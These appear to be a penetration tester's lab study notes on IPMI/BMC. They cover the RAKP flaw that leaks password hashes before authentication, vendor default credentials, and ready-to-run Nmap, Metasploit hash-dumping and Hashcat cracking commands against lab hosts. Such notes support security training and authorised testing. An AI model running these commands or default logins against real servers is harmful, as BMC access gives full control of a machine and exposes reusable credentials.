**IPMI (Intelligent Platform Management Interface)**  
IPMI is a hardware-based remote management protocol used to manage servers independently of the host OS. It runs on a dedicated controller called the **BMC (Baseboard Management Controller)** and works even when the server is powered off.

Port - 623 UDP

---

### 🔹 Key Characteristics

- Runs independently of OS, CPU, BIOS
- Requires only power + network
- Provides near **physical-level access**
- Common vendors: HP iLO, Dell iDRAC, Supermicro IPMI
- Default network port: **UDP 623**
- Compromise = full server control (reboot, reinstall OS, mount ISOs, BIOS access)

---

### 🔹 RAKP Authentication Flaw (IPMI 2.0)

During authentication, IPMI uses **RAKP (Remote Authenticated Key-Exchange Protocol)**.

⚠ **Critical design flaw**:  
The server sends a **salted hash of the user’s password to the client BEFORE authentication succeeds**.

This allows:

- Hash retrieval for **ANY valid username**
- No authentication required
- Offline password cracking

This is **not a bug**, it is a **protocol-level design flaw**.

---

### 🔹 Impact

- Attacker can dump password hashes remotely
- Hashes can be cracked offline (Hashcat mode 7300)
- If password reused → lateral movement
- Access to BMC ≈ physical access to server

---

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|

Always test defaults first.

---

### 🔹 Enumeration

**Nmap**

```bash
nmap -sU -p 623 --script ipmi-version <target>

sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

**Metasploit** sis

```
msfconsole
> use auxiliary/scanner/ipmi/ipmi_version
> set rhosts 10.129.42.195
> show options 
> run
```

---

### 🔹 Hash Dumping (RAKP Exploit)

**Metasploit**

```
# to retrive the password hash

msfconsole
> use auxiliary/scanner/ipmi/ipmi_dumphashes
> set rhosts 10.129.42.195
> set OUTPUT_HASHCAT_FILE ~/ipmi.txt
> show options 
> run
```

Output includes:

- Username
- Salt
- Password hash

![[Pasted image 20251217234337.png]]

Crack offline using Hashcat.

---
## Hashcat

```bash
# In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command 

hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

# which tries all combinations of upper case letters and numbers for an eight-character password.
```

---

Mitigations only:

- Network segmentation
- Disable IPMI over LAN
- Strong, unique passwords

---

### 🔹 Attacker Mindset

If you see:

```
623/udp open
```

Treat it as **HIGH / CRITICAL priority**.

IPMI access often leads to:

- Full host compromise
- Credential reuse
- Domain-wide impact
